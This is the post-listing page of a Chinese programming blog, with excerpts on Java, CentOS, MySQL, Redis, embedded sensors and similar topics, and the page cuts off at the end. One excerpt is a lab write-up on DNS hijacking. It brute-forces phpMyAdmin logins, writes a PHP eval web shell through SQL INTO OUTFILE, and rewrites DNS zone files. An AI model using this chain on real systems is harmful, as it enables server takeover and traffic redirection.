<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程鬼谷子的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程鬼谷子的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/620008c7b4a0824e84b04627f474f436/" rel="bookmark">
			JAVA学生成绩管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		只写了最基本的增删改查，其中可能会有一些没考虑到的地方。结尾有完整代码
首先是main方法
public static void main(String[] args) throws Exception { //创建Scanner对象和ArrayList集合 Scanner sc = new Scanner(System.in); ArrayList&lt;Student&gt; students = new ArrayList&lt;&gt;(); //放入死循环能一直运行 while (true) { Welcome(); Menu(sc, students); } } 然后是菜单和欢迎页面
//欢迎界面 private static void Welcome() { System.out.println("请选择您要进行的操作："); System.out.println("1.录入学生信息"); System.out.println("2.删除学生信息"); System.out.println("3.修改学生信息"); System.out.println("4.查询学生信息"); System.out.println("5.展示所有学生成绩信息"); System.out.println("0.退出系统"); } //真正的菜单 private static void Menu(Scanner sc, ArrayList&lt;Student&gt; students) { switch (sc.next()) { case "1" -&gt; add(sc, students); //添加学生信息 case "2" -&gt; deleteMessage(sc, students); //删除学生信息 case "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/620008c7b4a0824e84b04627f474f436/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bff897fb201c47bb673cc2997f8af0d5/" rel="bookmark">
			在VMware中安装CentOS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 准备工作 提前下载好VMware和Centos镜像
2. Vmware中Centos的配置 2.1 打开VMware Workstation软件，选择Create a New Virtual Machine 2.2 选择 Typical 选项，然后选择 next 2.3 选择 I will install the operating system later，然后点击next 2.4 客户机操作选择 Linux，版本选择CentOS 7 64-bit，点击next 2.5 输入虚拟机名称，选择虚拟机文件保存位置，点击next 2.6 最大磁盘默认20G大小即可，然后选择将虚拟机磁盘存储为单个文件，点击next 2.7 点击自动硬件配置 2.8 硬件设置 设置虚拟机运行内存
设置虚拟机核数
设置CentOS7的ISO镜像路径，点击Close
网络适配器默认NAT即可
2.9 点击Finish 3. CentOS7的安装 3.1 选中刚刚配置的CentOS7，然后点击Power on this virtual machine 3.2 虚拟机启动后会出现如下界面（白色表示选中），默认选中的是Test this media &amp; install CentOS 7 将鼠标移动到虚拟机中，并点击，按下键盘“↑”键，选择Install CentOS 7，最后按下“Enter”键
参数说明：
Install CentOS 7：安装CentOS 7 Test this media &amp; install CentOS 7：测试安装文件并安装CentOS 7 Troubleshooting：修复故障 注意：在虚拟机中的操作，鼠标必须要移入到虚拟机中，否则无法进行操作 鼠标移入虚拟机中并点击，鼠标即可移入到虚拟机中。 按下Ctrl + Alt，鼠标即可移除到虚拟机 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bff897fb201c47bb673cc2997f8af0d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a196df43974866fa0deca78a026d21a0/" rel="bookmark">
			C. 凑算式（11分）【蓝桥杯】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		具体出处 2016蓝桥杯cpp组
【第七届】【省赛】【B组】
凑算式 - 蓝桥云课 (lanqiao.cn)
题目描述 本题为填空题，只需要算出结果后，在代码中使用输出语句将所填结果输出即可。
B DEF A + --- + ------- = 10 C GHI 这个算式中 A ~ I 代表 0 ~ 9 的数字，不同的字母代表不同的数字。
比如： 6+8/3+952/7146+8/3+952/714 就是一种解法， 5+3/1+972/4865+3/1+972/486 是另一种解法。
这个算式一共有多少种解法？
运行限制 最大运行时间：1s
最大运行内存: 128M
AC代码： 做法1：dfs回溯全排列暴力枚举
#include&lt;bits/stdc++.h&gt; using namespace std; bool st[15]; int num[15], ans; void dfs(int n){ if(n==10){ // for(int i = 1; i&lt;=9; ++i) // cout&lt;&lt;num[i]&lt;&lt;" "; // cout&lt;&lt;"\n"; int x = num[4] * 100 + num[5] * 10 + num[6]; int y = num[7] * 100 + num[8] * 10 + num[9]; if (num[1] * num[3] * y + num[2] * y + x * num[3] == 10 * num[3] * y){ ans++; return; } } for(int i = 1; i&lt;=9; ++i){ if(st[i]) continue; st[i] = 1; num[n] = i; dfs(n+1); st[i] = 0; } } int main(){ dfs(1); //这个1表示第一个位置 cout&lt;&lt;ans; return 0; } 做法2：全排列函数next_permutation全排列暴力枚举
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a196df43974866fa0deca78a026d21a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1cabec04dee8cad391f1ca493641ed1/" rel="bookmark">
			idea使用断言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 测试程序 public class TestAssert { public static void main(String[] args) { String s1 = null; assert s1 != null; // 默认assert不起作用, 需开启-ve参数 System.out.println("test assert"); } } 开启assert检查 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71ebacee57bded6c52d56a8bf3bc7257/" rel="bookmark">
			域名劫持原理与实践学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		预备知识 了解域名及域名劫持 由于点分十进制的IP地址难于记忆，便出现了域名。由于网络传输中最终还是基于IP，所以必须通过一种机制将IP和域名一一对应起来，这便是DNS。全球总共有13台根域名服务器。
域名劫持是互联网攻击中常见的一种攻击方式，攻击者通过对DNS服务器进行攻击，或伪造DNS将目标站点解析到别的地址，用户访问该域名时被重定向到别的站点。在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。
域名劫持的原理 域名劫持的基本原理是用户输入要访问的域名，请求DNS服务器遍历DNS数据库，查找该域名对应的IP地址，将其结果返回给用户。在DNS服务器遍历DNS数据库时，如果修改了该域名对应的IP，便实现了域名劫持。简单来说就是：本来一个域名对应一个IP，当这个域名对应到别的IP上就称为域名劫持。如果知道该域名的真实IP地址，则可以直接用此IP代替域名后进行访问。
实验 实验目的&amp;环境 了解域名劫持的原理，完成对邮件服务器的劫持。
邮件服务器：Win2003，IP地址：10.1.1.10
另一台主机地址：10.1.1.253
测试者：win7，IP地址随机
实验过程 进入http://mail.test.com，看到一个登录入口
打开burpsuite,配置浏览器代理，将网络设置为手动，改为和你的burpsuite代理一致.刷新网页，成功抓包。
右键send to spider,回到target,更换显示设置，显示隐藏的文件夹。发现存在有隐藏的文件夹phpmyadmin。
也就是说，可以通过在mail.test.com的url后拼接phpmyadmin得到新的网页。拼接后，结果如下：
现在使用burpsuite暴力破解，需要先在用户名和密码栏输入任意字符。这里输入的是root和123.然后在burpsuite中发现抓获到的数据包。如果没有，可以反复点击forward，直到在数据包中发现basic：
右键basic后面的字符，可以将base64进行转换，得到输入的root&amp;123,说明这里就是填入用户名和密码的爆破点。
现在将其发送到intruder,将原先标记的clear$掉，再选中root:123,点击add$,表示等会进行字典攻击时只攻击这里。
7.切换到payloads选项卡，在payload options中先选到1，这是对用户名的爆破，添加root;admin;administor.并在下面的separator中输入:表示分割1和2.然后选到2，这是对密码的爆破，导入已经准备好的密码字典。然后配置payload processing，并取消勾选payload encoding中的对号。
8.准备好后，点击左上角的intruder菜单，点击start attack。这个时候能够看到很多状态码为4xx的结果，表示攻击失败，以及能看到一个状态码为200的结果，其长度也相对较长，表示攻击成功。获取其中的数据，找到basic,将字符转换一下，得到用户名为root,密码为1234567890的账号。
使用该账号登录，即可进入以下界面：
9.接下来需要知道网站的路径是什么，一般网站搭建好后都会存在info.php，phpinfo.php，php_info.php等测试文件，一一访问下，发现存在phpinfo.php文件，并得知网站目录为C:/xampp/xampp/htdocs。
此时需要通过phpmyadmin拿这个站点的shell，选择SQL，输入如下命令，点击执行：
use mysql;
Create TABLE heetian (heetian1 text NOT NULL); Insert INTO heetian(heetian1) VALUES('&lt;?php @eval($_POST[pass]);?&gt;'); select heetian1 from heetian into outfile 'C:/xampp/xampp/htdocs/test.php'; Drop TABLE IF EXISTS heetian; 10.执行后，会看到这样的结果：
此时访问http://mail.test.com/test.php是空白页面：
用菜刀连接一下：
11.找到C:\WINDOWS\system32\dns\etc中的test.com.zone和10.1.1.zone，将其中的主机地址改为10.1.1.253的，并保存。
12.在虚拟终端中重启dns服务，刷新mail.test.com后，发现劫持成功。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6368faefbc127c34138d0af4e97fa26b/" rel="bookmark">
			【嵌入式模块】MPU6050
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 前言1 MPU6050概述1.1 基本概述1.2 引脚和常用原理图 2 代码3 姿态解算3.1 欧拉角&amp;旋转矩阵3.2 DMP 3 校正 0 前言 作为惯性传感器中入门级别的器件，MPU6050凭借它出色的性价比成为一款非常常用的角度姿态传感器，在很多科创项目中被使用。我之前也接触过很多次这个器件，也收集了不少资料，趁此机会总结一下学习笔记。
1 MPU6050概述 1.1 基本概述 MPU6050包含3轴陀螺仪和3轴加速度计，其中陀螺仪的主要作用是测量物体绕芯片的三个坐标轴的角速度，其原理是高速旋转的转子指向的方向会保持不变，即所谓陀螺效应，详细介绍建议自行搜索“陀螺仪工作原理”；加速度计则是测量三个轴向的加速度，同样也是指芯片的三个坐标轴。其原理可以想象成一个立方体箱子里面有一个失重悬空的小球，当受到外界压力时，小球会朝着某个方向运动，箱子内壁就会受到对应大小的压力，从而可以计算出各个方向的加速度大小。
当整体受到向左的加速度时，小球会有一个相对箱子向右的加速度，从而右侧“箱壁”会受到对应加速度大小的力，这样就能计算出加速度的大小。
MPU6050是InvenSense公司推出的全球首款整合性6轴运动处理组件。目前InvenSense已被日本的TDK公司收购，在他官网（https://invensense.tdk.com/），可能是年代久远，MPU6050已经是该公司的边缘产品了，6轴芯片当中，6050和6500两款芯片被排在最后，还都是NOT RECOMMENDED的状态，而且资料支持也不是很完善，找遍了网站，也只找到了一个放数据手册的网页，开发相关的寄存器手册并未找到。因此，建议还是在网上去搜索资料吧，如下图所示，都是网上流传的经典资料。
MPU6050的核心就是它内部的寄存器。它内部有118个寄存器（编号从0到117）。其中需要注意，虽然寄存器手册上寄存器编号是从13开始，但实际上13之前的寄存器也是可以使用的（看后面的代码就知道了）。
这些寄存器有一些是用来设置参数的，可读可写；也有一些是存放一些数据供外部读取的，只可读。它是基于IIC进行通信，因此，在使用时，先找到传输器件地址，然后再传输寄存器地址，最后传输相应的数据或者指令，这也是IIC协议和器件寄存器交互的常用设定。
既然有这么多寄存器，那用起来岂不是很困难？并不是，虽然寄存器多，但实际使用时也不需要使用如此多的寄存器。而且即使要使用的话，也可以利用C语言中的宏定义，这样也不麻烦。
1.2 引脚和常用原理图 为了将这个芯片集成到我们需要的系统当中，就需要了解这款芯片的引脚和它常用的原理图，如下图所示，这个是市面上卖的MPU6050模块的原理图。
可以看到，这里引出了8个引脚，分别是电源引脚5V和GND，IIC通信引脚SCL和SDA，一般来说，大部分的应用只需要接这四个引脚即可。其中，XCL和XDA是额外的IIC通信引脚，主要用于连接外部的磁力传感器，并利用自带的运动处理器DMP硬件加速引擎，通过主IIC接口，向应用输出完整的9轴融合演算数据。
而AD0引脚是用来设置IIC通信中的从机地址，如果接地（不接），则从机地址为0x68， 如果接高电平，则从机地址为0x69。而INT引脚主要用于中断，如果要使用中断需要设置相关的寄存器。
2 代码 了解了MPU6050的基础知识，接下来就是写代码来使用了。如果还没确定使用的微处理器，我推荐先使用Arduino，因为它集成了很多的第三方库，这样在使用一些器件时不用自己再重复造轮子，只需要会调用即可。
在Arduino中也有MPU6050的库，如下图所示。
安装好库之后，接下来就找到给出的例子来学习它内部的代码了。
这里提供了6个例子，基本包含了大部分的使用。
当然，使用Arduino IDE也存在一个问题，那就是代码不能定位过去，查看库的源码不太方便，因此建议自己基于VS Code配一个Arduino的环境，或者直接下载插件Platform IO这个插件，具体的教程建议自行搜索。
具体可以看一下这个库的源码，主要是以下几个文件，各自的作用已标注清楚。
因此，如果不需要使用DMP时，只需要包含"MPU6050.h"即可。
那如果是其他的微处理器呢？比如51或者STM32等。这个可以考虑在网上找一些现成的，也可以考虑自己根据这个库文件的源码自己写一个适配某个处理器的库。本质就是IIC通信和寄存器的读取。这里放一个基于51的网上流传甚广的代码。
//**************************************** // Update to MPU6050 by shinetop // MCU: STC89C52 // 2012.3.1 // 功能: 显示加速度计和陀螺仪的10位原始数据 //**************************************** // 使用单片机STC89C52 // 晶振：11.0592M // 显示：串口 // 编译环境 Keil uVision2 //**************************************** #include &lt;REG52.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6368faefbc127c34138d0af4e97fa26b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38d95a09c38b5211df7f6a935f2789b7/" rel="bookmark">
			python获取京东服务器的毫秒级时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果 代码 import requests import datetime while True: class Jingdongtime(object): r1 = requests.get(url='https://api.m.jd.com/client.action?functionId=queryMaterialProducts&amp;client=wh5', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'}) x = eval(r1.text) timeNum = int(x['currentTime2']) def funcname(): timeStamp = float(Jingdongtime.timeNum) / 1000 ret_datetime = datetime.datetime.utcfromtimestamp(timeStamp).strftime("%Y-%m-%d %H:%M:%S.%f") return ret_datetime t = Jingdongtime.funcname() print(t) 2023/03/15更新为下面的 思路是一样的，所以就把上面的留下来了
import requests import datetime while True: class Jingdongtime(object): r1 = requests.get(url='https://api.m.jd.com/client.action?functionId=queryMaterialAdverts&amp;client=wh5', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38d95a09c38b5211df7f6a935f2789b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2f07be09345528f6e92ba93ae0e2473/" rel="bookmark">
			前端实现下载pdf功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue点击下载，下载pdf 图片展示 前端代码 //下载 downloadFile(){ let params = { //参数列表 path: this.fileName }; var Axios = axios.create({ timeout: 3600 * 1000 }); //添加请求拦截器 Axios.interceptors.request.use( function (config) { // 在发送请求之前处理 // header头添加token config.headers['authc-token'] = window.localStorage.token; return config; }, function (error) { // 发送请求错误处理 return Promise.reject(error); } ); let url = "请求接口" Axios.post(url, params, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, responseType: "blob" }).then(res =&gt; { const link = document.createElement("a"); let blob = new Blob([res.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2f07be09345528f6e92ba93ae0e2473/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a7828c43f838bfd61bf2040a6742679/" rel="bookmark">
			Python&#43;Opencv寻找图像中最亮的区域
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、场景需求解读二、算法原理简介三、算法代码实现四、代码运行步骤五、算法效果展示和分析六、思维扩展参考资料注意事项 一、场景需求解读 在有些现实场景中，我们需要去使用算法自动的寻找到图片中的最亮的区域，这个区域是我们感兴趣的目标所在的位置，比较典型的是一个应用是视网膜图像，图像中视网膜所在的位置比较亮，而其它地方比较暗，我们更加关注视网膜所在的区域，因而需要使用算法自动的寻找到这个区域，然后针对这个区域进行处理和分析。下图展示了一个样例图片。
二、算法原理简介 要检测出图像中最亮的区域，我们可以直接使用opencv中自带的函数(minVal, maxVal, minLoc, maxLoc) = cv2.minMaxLoc(gray)，该函数是用来获取图像中的最大值和最小值 所在的位置，而图像中的最大值其实就是最亮的像素点，图像中的最小值其实就是最暗的像素点，该函数的输入参数是一张灰度图像，该函数会返回最大值、最小值、最大值所在位置和最小值所在位置等，我们可以根据获得的位置信息绘制结果。
三、算法代码实现 # coding=utf-8 # 导入python包 import numpy as np import argparse import cv2 # 构建并解析参数 ap = argparse.ArgumentParser() ap.add_argument("-i", "--image", help = "path to the image file") ap.add_argument("-r", "--radius", type = int, help = "radius of Gaussian blur; must be odd") args = vars(ap.parse_args()) # 读取图片并将其转化为灰度图片 image = cv2.imread(args["image"]) orig = image.copy() gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY) # 利用cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a7828c43f838bfd61bf2040a6742679/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b3cba061a6ad91ce7d27c9a7e5c79ca/" rel="bookmark">
			CentOS8 服务篇4：FTP文件传输服务搭建与配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FTP 文件传输服务三种配置模式： 匿名模式 本地用户模式 虚拟用户模式
安装ftp服务
安装完后再根据不同模式进行配置
[root@localhost yum.repos.d]# yum install -y vsftpd ftp
（vsftpd是搭建ftp服务器的，ftp是拿来测试的）
一、匿名模式配置
配置文件修改 [root@localhost ~]# vim /etc/vsftpd/vsftpd.conf
只有第一条是必改的，其他的根据要求添加修改即可
12 anonymous_enable=YES 允许匿名用户访问
28 anon_upload_enable=YES 允许匿名用户上传文件
32 anon_mkdir_write_enable=YES 允许匿名用户创建目录
这两个配置文件里没有，在文件最下面手打
127 anon_umask=022 匿名用户上传文件的umask值
128 anon_other_write_enable=YES 允许匿名用户修改目录名称或删除目录
防火墙设置
一般来说，这两条不打也没问题
清空iptables防火墙策略，保存状态
[root@localhost ~]# iptables -F
[root@localhost ~]# iptables-save 会弹一堆东西，是正常的
将ftp服务放行，保存防火墙配置
[root@localhost ~]# firewall-cmd --permanent --zone=public --add-service=ftp
success
[root@localhost ~]# firewall-cmd --reload success
selinux配置
[root@localhost ~]# getsebool -a | grep ftp
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b3cba061a6ad91ce7d27c9a7e5c79ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b8ecfa628a17e2899fa7caa8aa36022/" rel="bookmark">
			从0到1！Ubuntu上搭建Kubernetes Cluster
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、环境准备
二、初始化工作
1. 设置root用户密码
2. 使用xshell连接三台主机
3. 设置主机名和修改hosts文件
4. 安装依赖软件以及关闭停用不需要使用的软件
5. 时间的同步与时区设置
6. 关闭swap分区
7. 在 kube-proxy 开启并使用 ipvs
8. 集群各主机节点内核Kernel参数的调整
三、安装docker和k8s
1. 各个节点安装docker
2. 下载 kubernetes 集群相关的软件包
四、初始化集群
1. 在主节点上初始化集群
2. 配置 kubectl
3. 安装Pod网络
4. 添加k8s-node1和k8s-node2
一、环境准备 Ubuntu镜像下载地址：Index of /ubuntu-releases/20.04/ | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror
使用VMware安装三个节点，一个作为master主节点，如下：
注意每个节点内存不少于2G，CPU不少于2个，内存30GB以上
名字IPk8s-master192.168.65.145k8s-node1192.168.65.142k8s-node2192.168.65.141 本博客安装版本说明：
k8s版本：1.19.10
docker版本：19.03 二、初始化工作 1. 设置root用户密码 zy@ubuntu:~/Desktop$ sudo passwd root [sudo] password for zy: New password: Retype new password: passwd: password updated successfully 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b8ecfa628a17e2899fa7caa8aa36022/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58349fe3b9ea6466bfec9b4d75591056/" rel="bookmark">
			MySQL经典面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. MySQL索引使用有哪些注意事项呢？ 可以从三个维度回答这个问题：索引哪些情况会失效，索引不适合哪些场景，索引规则
索引哪些情况会失效 查询条件包含or，可能导致索引失效如何字段类型是字符串，where时一定用引号括起来，否则索引失效like通配符可能导致索引失效。联合索引，查询时的条件列不是联合索引中的第一个列，索引失效。在索引列上使用mysql的内置函数，索引失效。对索引列运算（如，+、-、*、/），索引失效。索引字段上使用（！= 或者 &lt; &gt;，not in）时，可能会导致索引失效。索引字段上使用is null， is not null，可能导致索引失效。左连接查询或者右连接查询查询关联的字段编码格式不一样，可能导致索引失效。mysql估计使用全表扫描要比使用索引快,则不使用索引。 索引不适合哪些场景 数据量少的不适合加索引更新比较频繁的也不适合加索引区分度低的字段不适合加索引（如性别） 索引的一些潜规则 覆盖索引回表索引数据结构（B+树）最左前缀原则索引下推 2. MySQL遇到过死锁问题吗，你是如何解决的？ 我排查死锁的一般步骤是酱紫的：
查看死锁日志show engine innodb status;找出死锁Sql分析sql加锁情况模拟死锁案发分析死锁日志分析死锁结果 3. 日常工作中你是怎么优化SQL的？ 可以从这几个维度回答这个问题：
加索引避免返回不必要的数据适当分批量进行优化sql结构分库分表读写分离 4. 说说分库与分表的设计 分库分表方案，分库分表中间件，分库分表可能遇到的问题
分库分表方案:
水平分库：以字段为依据，按照一定策略（hash、range等），将一个库中的数据拆分到多个库中。水平分表：以字段为依据，按照一定策略（hash、range等），将一个表中的数据拆分到多个表中。垂直分库：以表为依据，按照业务归属不同，将不同的表拆分到不同的库中。垂直分表：以字段为依据，按照字段的活跃性，将表中字段拆到不同的表（主表和扩展表）中。 常用的分库分表中间件：
sharding-jdbc（当当）MycatTDDL（淘宝）Oceanus(58同城数据库中间件)vitess（谷歌开发的数据库中间件）Atlas(Qihoo 360) 分库分表可能遇到的问题
事务问题：需要用分布式事务啦跨节点Join的问题：解决这一问题可以分两次查询实现跨节点的count,order by,group by以及聚合函数问题：分别在各个节点上得到结果后在应用程序端进行合并。数据迁移，容量规划，扩容等问题ID问题：数据库被切分后，不能再依赖数据库自身的主键生成机制啦，最简单可以考虑UUID跨分片的排序分页问题（后台加大pagesize处理？） 5. InnoDB与MyISAM的区别 InnoDB支持事务，MyISAM不支持事务InnoDB支持外键，MyISAM不支持外键InnoDB 支持 MVCC(多版本并发控制)，MyISAM 不支持select count(*) from table时，MyISAM更快，因为它有一个变量保存了整个表的总行数，可以直接读取，InnoDB就需要全表扫描。Innodb不支持全文索引，而MyISAM支持全文索引（5.7以后的InnoDB也支持全文索引）InnoDB支持表、行级锁，而MyISAM支持表级锁。InnoDB表必须有主键，而MyISAM可以没有主键Innodb表需要更多的内存和存储，而MyISAM可被压缩，存储空间较小，。Innodb按主键大小有序插入，MyISAM记录插入顺序是，按记录插入顺序保存。InnoDB 存储引擎提供了具有提交、回滚、崩溃恢复能力的事务安全，与 MyISAM 比 InnoDB 写的效率差一些，并且会占用更多的磁盘空间以保留数据和索引 6. 数据库索引的原理，为什么要用B+树，为什么不用二叉树？ 可以从几个维度去看这个问题，查询是否够快，效率是否稳定，存储数据多少，以及查找磁盘次数，为什么不是二叉树，为什么不是平衡二叉树，为什么不是B树，而偏偏是B+树呢？
为什么不是一般二叉树？
如果二叉树特殊化为一个链表，相当于全表扫描。平衡二叉树相比于二叉查找树来说，查找效率更稳定，总体的查找速度也更快。
为什么不是平衡二叉树呢？
我们知道，在内存比在磁盘的数据，查询效率快得多。如果树这种数据结构作为索引，那我们每查找一次数据就需要从磁盘中读取一个节点，也就是我们说的一个磁盘块，但是平衡二叉树可是每个节点只存储一个键值和数据的，如果是B树，可以存储更多的节点数据，树的高度也会降低，因此读取磁盘的次数就降下来啦，查询效率就快啦。
那为什么不是B树而是B+树呢？
1）B+树非叶子节点上是不存储数据的，仅存储键值，而B树节点中不仅存储键值，也会存储数据。innodb中页的默认大小是16KB，如果不存储数据，那么就会存储更多的键值，相应的树的阶数（节点的子节点树）就会更大，树就会更矮更胖，如此一来我们查找数据进行磁盘的IO次数有会再次减少，数据查询的效率也会更快。
2）B+树索引的所有数据均存储在叶子节点，而且数据是按照顺序排列的，链表连着的。那么B+树使得范围查找，排序查找，分组查找以及去重查找变得异常简单。
7. 聚集索引与非聚集索引的区别 一个表中只能拥有一个聚集索引，而非聚集索引一个表可以存在多个。聚集索引，索引中键值的逻辑顺序决定了表中相应行的物理顺序；非聚集索引，索引中索引的逻辑顺序与磁盘上行的物理存储顺序不同。索引是通过二叉树的数据结构来描述的，我们可以这么理解聚簇索引：索引的叶节点就是数据节点。而非聚簇索引的叶节点仍然是索引节点，只不过有一个指针指向对应的数据块。聚集索引：物理存储按照索引排序；非聚集索引：物理存储不按照索引排序； 何时使用聚集索引或非聚集索引？
8. limit 1000000加载很慢的话，你是怎么解决的呢？ 方案一：如果id是连续的，可以这样，返回上次查询的最大记录(偏移量)，再往下limit select id，name from employee where id&gt;1000000 limit 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58349fe3b9ea6466bfec9b4d75591056/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f84d9990690556d089d9f6429ae2991/" rel="bookmark">
			Redis分布式锁的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 非原子操作（setnx + expire） 一说到实现Redis的分布式锁，很多小伙伴马上就会想到setnx+ expire命令。也就是说，先用setnx来抢锁，如果抢到之后，再用expire给锁设置一个过期时间。
伪代码如下：
if（jedis.setnx(lock_key,lock_value) == 1）{ //加锁 jedis.expire(lock_key，timeout）; //设置过期时间 doBusiness //业务逻辑处理 } 这块代码是有坑的，因为setnx和expire两个命令是分开写的，并不是原子操作！如果刚要执行完setnx加锁，正要执行expire设置过期时间时，进程crash或者要重启维护了，那么这个锁就“长生不老”了，别的线程永远获取不到锁啦。
2.被别的客户端请求覆盖（ setnx + value为过期时间） 为了解决：发生异常时，锁得不到释放的问题。有小伙伴提出，可以把过期时间放到setnx的value里面。如果加锁失败，再拿出value值和当前系统时间校验一下是否过期即可。伪代码实现如下：
long expireTime = System.currentTimeMillis() + timeout; //系统时间+设置的超时时间 String expireTimeStr = String.valueOf(expireTime); //转化为String字符串 // 如果当前锁不存在，返回加锁成功 if (jedis.setnx(lock_key, expireTimeStr) == 1) { return true; } // 如果锁已经存在，获取锁的过期时间 String oldExpireTimreStr = jedis.get(lock_key); // 如果获取到的老的预期过期时间，小于系统当前时间，表示已经过期了 if (oldExpireTimreStr != null &amp;&amp; Long.parseLong(oldExpireTimreStr) &lt; System.currentTimeMillis()) { //锁已过期，获取上一个锁的过期时间，并设置现在锁的过期时间（不了解redis的getSet命令的小伙伴，可以去官网看下哈） String oldValueStr = jedis.getSet(lock_key, expireTimeStr); if (oldValueStr !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f84d9990690556d089d9f6429ae2991/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1e96216fd213e606e9446298a984f68/" rel="bookmark">
			npm 安装依赖报错npm ERR ERESOLVE unable to resolve dependency tree
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PS F:devops_commoncloud-vue&gt; npm cache cache sudo npm cache clean -f
npm WARN using --force Recommended protections disabled.
npm ERR! code EUSAGE
npm ERR! npm cache
npm ERR!
npm ERR! Manipulates packages cache
npm ERR!
npm ERR! Usage:
npm ERR! npm cache add
npm ERR! npm cache add
npm ERR! npm cache add
npm ERR! npm cache add @
npm ERR! npm cache clean
npm ERR! npm cache verify
npm ERR!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1e96216fd213e606e9446298a984f68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
